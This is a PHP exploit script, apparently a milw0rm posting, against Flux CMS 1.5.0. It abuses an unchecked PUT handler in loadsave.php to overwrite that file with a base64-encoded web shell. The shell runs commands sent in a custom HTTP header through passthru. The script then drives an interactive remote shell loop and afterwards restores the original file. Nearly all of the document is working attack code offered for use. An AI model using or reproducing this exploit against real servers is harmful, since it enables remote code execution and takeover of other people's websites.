<?php

/*
	------------------------------------------------------------------------
	Flux CMS <= 1.5.0 (loadsave.php) Remote Arbitrary File Overwrite Exploit
	------------------------------------------------------------------------
	
	author...: EgiX
	mail.....: n0b0d13s[at]gmail[dot]com
	
	link.....: http://www.flux-cms.org/

	[-] vulnerable code in /webinc/bxe/scripts/loadsave.php

	12.	header("Content-Type: text/html");
	13.
	14.	$xmlfile = realpath($_GET['XML']);
	
	(...)
	
	24.	$basedir = dirname(dirname(__FILE__));
	25.	
	26.	if (strpos($xmlfile,$basedir) !== 0) {
	27.	    die("you are not allowed to read/write this file (".$_GET['XML'].")");
	28.	}
	29.	
	30.	//If saving, then REQUEST METHOD is PUT
	31.	// and we have to set the response code to 204 
	32.	
	33.	if ($_SERVER['REQUEST_METHOD'] == "PUT") {
	34.	    $fd = fopen ($_GET['XML'], "w");
	35.	    if ($fd) {
	36.	        // read sent content
	37.	        $content = file_get_contents("php://input");
	38.	        //write content
	39.	        fwrite($fd,$content);
	40.	        fclose($fd);
	41.	        //sent correct HTTP header
	42.	        header("HTTP/1.1 204 No Content");
	43.	        
	44.	    } else {
	45.	        die ("couldn't write to ".$_GET['XML']);
	46.	    }
	47.	}
	
	an attacker might be able to overwrite an existing file with arbitrary raw POST data
	this poc try to overwrite loadsave.php itself due to restrictions at lines 24-28
*/

error_reporting(0);
set_time_limit(0);
ini_set("default_socket_timeout", 5);

function http_send($host, $packet)
{
	$sock = fsockopen($host, 80);
	while (!$sock)
	{
		print "\n[-] No response from ".$host.":80 Trying again...";
		$sock = fsockopen($host, 80);
	}
	fputs($sock, $packet);
	while (!feof($sock)) $resp .= fread($sock, 1024);
	fclose($sock);
	return $resp;
}

print "\n+-------------------------------------------------------------------+";
print "\n| Flux CMS <= 1.5.0 Remote Arbitrary File Overwrite Exploit by EgiX |";
print "\n+-------------------------------------------------------------------+\n";

if ($argc < 3)
{
	print "\nUsage.....: php $argv[0] host path\n";
	print "\nExample...: php $argv[0] localhost /";
	print "\nExample...: php $argv[0] localhost /fluxcms/\n";
	die();
}

$host = $argv[1];
$path = $argv[2];

$payload = base64_decode(
	"PD9waHAgDQppZiAoaXNzZXQoJF9TRVJWRVJbSFRUUF9CQUNLXSkpIHsJDQoJJGRhdGEgPQ0KCSJQRDl3YUhBS0x5b3FDaUIwYUds" .
	"eklITmpjbWx3ZENCc2IyRmtjeUJoYm1RZ2MyRjJaWE1nV0UxTUlHUnZZM1Z0Wlc1MElIZHBkR2dnZEciIC4NCgkiaGxJR2hsYkhB" .
	"Z2IyWWdVRWhRQ2dvZ2FXNGdlVzkxY2lCamIyNW1hV2N1ZUcxc0lIbHZkU0IzYjNWc1pDQjBhR1Z1SUhkeWFYUmxDaUFLIiAuDQoJ" .
	"IklEeG1hV3hsSUc1aGJXVTlJa0pZWDNodGJHWnBiR1VpUGk5d1lYUm9MM1J2TDNsdmRYSXZiRzloWkhOaGRtVXVjR2h3UDFoTlRE" .
	"MXdZWCIgLg0KCSJSb0wzUnZMMk52Ym5SbGJuUXVlRzFzUEM5bWFXeGxQZ29LSUc1bFpXUnpJRkJJVUNBMExqTWdiM0lnVUVoUUlE" .
	"VXVJSE5wYldsc1lYSWciIC4NCgkiYVhNZ1lXeHpieUJ3YjNOemFXSnNaU0IzYVhSb0lGQklVQ0E4SURRdU13b3FMd29LYUdWaFpH" .
	"VnlLQ0pEYjI1MFpXNTBMVlI1Y0dVNklIIiAuDQoJIlJsZUhRdmFIUnRiQ0lwT3dvS0pIaHRiR1pwYkdVZ1BTQnlaV0ZzY0dGMGFD" .
	"Z2tYMGRGVkZzbldFMU1KMTBwT3dvdktpQjJaWEo1SUdOeSIgLg0KCSJkV1JsSUdGdVpDQnphVzF3YkdVZ2MyVmpkWEpwZEhrZ1ky" .
	"aGxZMnNLQ2lBZ0lDQjNaU0JoYkd4dmR5QnZibXg1SUdsdVkyeDFjMmx2YmkiIC4NCgkiQnZaaUJtYVd4bGN5d2dkMmhwWTJnS0lD" .
	"QWdJR0Z5WlNCemIyMWxkMmhsY21VZ2FXNGdkR2hsSUdScGNtVmpkRzl5ZVNCdmJtVWdiR1YyIiAuDQoJIlpXd0tJQ0FnSUdGaWIz" .
	"WmxJSFJvYVhNZ2MyTnlhWEIwTGlCWmIzVWdhR0YyWlNCMGJ5QmphR0Z1WjJVZ2RHaHBjd29nSUNBZ2NuVnNaUyIgLg0KCSJ3Z2FX" .
	"WWdlVzkxSUhkaGJuUWdkRzhnYVc1amJIVmtaU0JtY205dElITnZiV1YzYUdWeVpRb2dJQ0FnWld4elpTd2dZblYwSUcxaGEyVWci" .
	"IC4NCgkiYzNWeVpTd2dhWFFnWTJGdUozUWdjbVZoWkNCaGJua2djMlZ1YzJsMGFYWmxDaUFnSUNCbWFXeGxjeTR1Q2lvdkNpUmlZ" .
	"WE5sWkdseUlEIiAuDQoJIjBnWkdseWJtRnRaU2hrYVhKdVlXMWxLRjlmUmtsTVJWOWZLU2s3Q2dwcFppQW9jM1J5Y0c5ektDUjRi" .
	"V3htYVd4bExDUmlZWE5sWkdseSIgLg0KCSJLU0FoUFQwZ01Da2dld29nSUNBZ1pHbGxLQ0o1YjNVZ1lYSmxJRzV2ZENCaGJHeHZk" .
	"MlZrSUhSdklISmxZV1F2ZDNKcGRHVWdkR2hwY3kiIC4NCgkiQm1hV3hsSUNnaUxpUmZSMFZVV3lkWVRVd25YUzRpS1NJcE93cDlD" .
	"Z292TDBsbUlITmhkbWx1Wnl3Z2RHaGxiaUJTUlZGVlJWTlVJRTFGIiAuDQoJIlZFaFBSQ0JwY3lCUVZWUUtMeThnWVc1a0lIZGxJ" .
	"R2hoZG1VZ2RHOGdjMlYwSUhSb1pTQnlaWE53YjI1elpTQmpiMlJsSUhSdklESXdOQyIgLg0KCSJBS0NtbG1JQ2drWDFORlVsWkZV" .
	"bHNuVWtWUlZVVlRWRjlOUlZSSVQwUW5YU0E5UFNBaVVGVlVJaWtnZXdvZ0lDQWdKR1prSUQwZ1ptOXciIC4NCgkiWlc0Z0tDUmZS" .
	"MFZVV3lkWVRVd25YU3dnSW5jaUtUc0tJQ0FnSUdsbUlDZ2tabVFwSUhzS0lDQWdJQ0FnSUNBdkx5QnlaV0ZrSUhObGJuIiAuDQoJ" .
	"IlFnWTI5dWRHVnVkQW9nSUNBZ0lDQWdJQ1JqYjI1MFpXNTBJRDBnWm1sc1pWOW5aWFJmWTI5dWRHVnVkSE1vSW5Cb2NEb3ZMMmx1" .
	"Y0hWMCIgLg0KCSJJaWs3Q2lBZ0lDQWdJQ0FnTHk5M2NtbDBaU0JqYjI1MFpXNTBDaUFnSUNBZ0lDQWdabmR5YVhSbEtDUm1aQ3dr" .
	"WTI5dWRHVnVkQ2s3Q2kiIC4NCgkiQWdJQ0FnSUNBZ1ptTnNiM05sS0NSbVpDazdDaUFnSUNBZ0lDQWdMeTl6Wlc1MElHTnZjbkps" .
	"WTNRZ1NGUlVVQ0JvWldGa1pYSUtJQ0FnIiAuDQoJIklDQWdJQ0JvWldGa1pYSW9Ja2hVVkZBdk1TNHhJREl3TkNCT2J5QkRiMjUw" .
	"Wlc1MElpazdDaUFnSUNBZ0lDQWdDaUFnSUNCOUlHVnNjMiIgLg0KCSJVZ2V3b2dJQ0FnSUNBZ0lHUnBaU0FvSW1OdmRXeGtiaWQw" .
	"SUhkeWFYUmxJSFJ2SUNJdUpGOUhSVlJiSjFoTlRDZGRLVHNLSUNBZ0lIMEsiIC4NCgkiZlNBS0x5OXZkR2hsY25kcGMyVWdhWFFu" .
	"Y3lCcWRYTjBJR0VnWjJWMElGSkZVVlZGVTFRS1pXeHpaU0I3Q2lBZ0lDQndjbWx1ZENCbWFXIiAuDQoJInhsWDJkbGRGOWpiMjUw" .
	"Wlc1MGN5Z2tYMGRGVkZzbldFMU1KMTBwT3dwOUNqOCsiOw0KCSRmZCA9IGZvcGVuKCJsb2Fkc2F2ZS5waHAiLCAidyIpOw0KCWZ3" .
	"cml0ZSgkZmQsIGJhc2U2NF9kZWNvZGUoJGRhdGEpKTsNCiAgICBmY2xvc2UoJGZkKTsNCglleGl0KCk7DQp9DQoke3ByaW50KF9j" .
	"b2RlXyl9LiR7cGFzc3RocnUoYmFzZTY0X2RlY29kZSgkX1NFUlZFUltIVFRQX0NNRF0pKX0uJHtwcmludChfY29kZV8pfQ0KPz4=" );

$packet  = "PUT {$path}webinc/bxe/scripts/loadsave.php?XML=loadsave.php HTTP/1.0\r\n";
$packet .= "Host: {$host}\r\n";
$packet .= "Content-Length: ".strlen($payload)."\r\n";
$packet .= "Connection: close\r\n\r\n";
$packet .= $payload;

if (!preg_match("/204 No Content/i", http_send($host, $packet))) die("\n[-] Exploit failed...\n");

define(STDIN, fopen("php://stdin", "r"));

while(1)
{
	print "\nfluxcms-shell# ";
	$cmd = trim(fgets(STDIN));
	if ($cmd != "exit")
	{
		$packet = "GET {$path}webinc/bxe/scripts/loadsave.php HTTP/1.0\r\n";
		$packet.= "Host: {$host}\r\n";
		$packet.= "Cmd: ".base64_encode($cmd)."\r\n";
		$packet.= "Connection: close\r\n\r\n";
		$output = http_send($host, $packet);
		if (!preg_match("/_code_/", $output)) die("\n[-] Exploit failed...\n");
		$shell = explode("_code_", $output);
		print "\n".$shell[1];
	}
	else break;
}

// backup the original script
$packet = "GET {$path}webinc/bxe/scripts/loadsave.php HTTP/1.0\r\n";
$packet.= "Host: {$host}\r\n";
$packet.= "Back:\r\n";
$packet.= "Connection: close\r\n\r\n";
http_send($host, $packet);

?>

# milw0rm.com [2008-06-09]
